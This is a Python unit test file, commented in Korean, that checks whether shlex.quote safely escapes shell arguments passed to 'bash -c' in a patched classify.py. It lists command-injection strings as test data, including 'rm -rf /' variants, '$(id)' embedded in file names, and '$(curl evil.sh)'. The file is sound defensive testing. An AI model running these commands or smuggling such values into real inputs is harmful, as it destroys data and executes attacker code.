"""
classify.py 보안 패치 단위 테스트
bash -c 인자 조합 방식 검증
"""
import shlex


def test_bash_c_arg_combination():
    """bash -c 'script' _ arg1 arg2 형식 검증"""
    script = '''
mkdir -p "$1" || { echo "MKDIR_FAIL"; exit 1; }
if [ -f "$2" ]; then
    rm -f "$3" && echo "SKIP_DUP" || echo "RM_FAIL"
else
    mv "$3" "$2" && echo "MOVED" || echo "MV_FAIL"
fi
'''
    dest_dir = "/data/complete/JPN"
    dest = "/data/complete/JPN/$(id).mkv"
    src = "/data/complete/$(id).mkv"

    cmd_parts = [
        "bash", "-c",
        script,
        "_",
        dest_dir,
        dest,
        src,
    ]

    full_cmd = " ".join(shlex.quote(p) for p in cmd_parts)

    # shlex.quote가 특수문자를 이스케이프하는지 확인
    # $(id)가 '$1', '$2', '$3' 위치의 리터럴로 전달되어야 함
    assert "$(id)" in full_cmd  # 문자열 자체는 포함되지만
    assert shlex.quote("$(id)") == "'$(id)'"  # single-quote로 감싸져야 함


def test_shlex_quote_escapes_shell_metacharacters():
    """shlex.quote가 모든 쉘 메타문자를 이스케이프하는지 확인"""
    # 다양한 공격 벡터 테스트
    attack_vectors = [
        "$(id)",
        "`id`",
        "; rm -rf /",
        "&& rm -rf /",
        "| rm -rf /",
        "$HOME",
        "${HOME}",
        "\nls",
        "$(curl evil.sh)",
        "a$(id)b.mkv",
    ]

    for vec in attack_vectors:
        quoted = shlex.quote(vec)
        # 단일 인용부호로 감싸져야 함
        assert quoted.startswith("'") and quoted.endswith("'"), f"Failed for: {vec}"
        # 내부의 '는 '\''로 이스케이프되지만, 위 벡터에는 '가 없으므로 그대로
        # 중요: single-quote 내부에서는 $, `, ; 등이 전혀 해석되지 않음
